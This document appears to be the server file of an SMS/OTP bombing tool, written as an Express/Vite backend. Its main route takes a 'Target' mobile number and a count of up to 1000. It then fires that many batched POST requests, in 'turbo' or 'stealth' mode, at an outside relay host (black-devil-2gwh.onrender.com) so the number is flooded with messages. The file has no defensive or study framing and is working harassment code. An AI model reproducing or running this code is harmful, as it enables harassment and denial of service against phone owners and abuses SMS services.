import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
// @ts-ignore
import cors from "cors";

// @ts-ignore
const corsMiddleware = cors.default || cors;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express
const app = express();
app.use(corsMiddleware());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Global Request Logger
app.use((req, res, next) => {
  console.log(`[REQ] ${new Date().toISOString()} | ${req.method} ${req.url}`);
  next();
});

// Simple in-memory rate limiting
const rateLimitMap = new Map<string, number>();

// Health check to verify server is alive
app.get("/api/ping", (req, res) => {
  res.json({ 
    status: "ALIVE", 
    timestamp: new Date().toISOString(),
    platform: process.env.VERCEL ? 'vercel' : 'node'
  });
});

  app.post("/api/otp/request", async (req, res) => {
    try {
      const { mobile, custom_sms, count, mode, ...techData } = req.body;
      const ip = req.ip || "unknown";
      
      const mobileNum = String(mobile || "").replace(/\D/g, "");
      if (mobileNum.length < 10) {
        return res.status(400).json({ error: "VALIDATION_ERROR", msg: "Invalid 10-digit number." });
      }

      const seed = custom_sms || "AUTO_GEN";
      const seedHash = crypto.createHash('sha256').update(seed + mobile).digest('hex').slice(0, 16);
      const requestCount = Math.min(Math.max(parseInt(count) || 1, 1), 1000); 
      const isTurbo = mode === "turbo";
      
      const now = Date.now();
      const last = rateLimitMap.get(ip) || 0;
      if (now - last < 2000) {
        return res.status(429).json({ error: "FIREWALL_ACTIVE", msg: "Cooldown active. Wait 2s." });
      }
      rateLimitMap.set(ip, now);

      console.log(`[V5.5_NODE] [${seedHash}] Target: ${mobileNum} | Mode: ${isTurbo ? 'TURBO' : 'STEALTH'}`);

      const params = new URLSearchParams();
      params.append("mobile", mobileNum);
      params.append("custom_sms", custom_sms || "XfsoCeXADQAg");
      Object.entries(techData).forEach(([k, v]) => {
        params.append(k, typeof v === 'object' ? JSON.stringify(v) : String(v));
      });

      const fireRequest = async () => {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 6000);
          await fetch("https://black-devil-2gwh.onrender.com/", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: params.toString(),
            signal: controller.signal
          });
          clearTimeout(timeoutId);
        } catch (e) {}
      };

      const batchSize = isTurbo ? 25 : 5;
      const delay = isTurbo ? 10 : 400;

      (async () => {
        for (let i = 0; i < requestCount; i += batchSize) {
          const p = Array.from({ length: Math.min(batchSize, requestCount - i) }).map(() => fireRequest());
          await Promise.all(p);
          if (i + batchSize < requestCount) await new Promise(r => setTimeout(r, delay));
        }
        console.log(`[V5.5_NODE] Finished for ${mobileNum}`);
      })().catch(console.error);

      res.json({
        status: "STABLE",
        metadata: { session_id: seedHash, packets: requestCount, protocol: "V5.5-HYPER-SYNC" }
      });
    } catch (err: any) {
      console.error("GATEWAY_ERROR:", err);
      res.status(500).json({ error: "INTERNAL_CORE_LEAK", msg: "Handshake failed." });
    }
  });

  // Catch-all API error to prevent HTML/404 ambiguity
  app.use("/api/*", (req, res) => {
    console.log(`[API_404] No route for ${req.method} ${req.url}`);
    res.status(404).json({ 
      error: "ENDPOINT_UNREACHABLE", 
      requested_path: req.url,
      method: req.method,
      server_time: new Date().toISOString()
    });
  });

// Setup function to handle Vite and Static Assets
async function setupServer() {
  try {
    if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
      const vite = await createViteServer({ server: { middlewareMode: true }, appType: "spa" });
      app.use(vite.middlewares);
    } else {
      const distPath = path.join(process.cwd(), "dist");
      app.use(express.static(distPath));
      app.get("*", (req, res) => {
        res.sendFile(path.join(distPath, "index.html"));
      });
    }

    const PORT = Number(process.env.PORT) || 3000;
    if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
      app.listen(PORT, "0.0.0.0", () => {
        console.log(`[CORE] Portal stabilized on port ${PORT}`);
      });
    }
  } catch (error) {
    console.error("[CRITICAL] Dynamic node initialization failed:", error);
  }
}

setupServer().catch(err => console.error("[FATAL] Server setup failure:", err));

// Global crash protection
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception thrown:', err);
});
export default app;
